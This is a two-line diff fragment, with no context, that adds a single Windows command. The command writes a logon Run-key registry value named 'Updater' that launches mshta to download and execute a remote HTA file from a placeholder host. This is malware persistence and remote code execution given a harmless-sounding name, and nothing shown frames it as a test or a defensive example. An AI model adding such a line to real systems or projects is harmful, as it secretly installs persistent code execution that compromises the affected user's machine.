@@ -1,0 +1,2 @@
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "mshta http://example.invalid/a.hta" /f
+
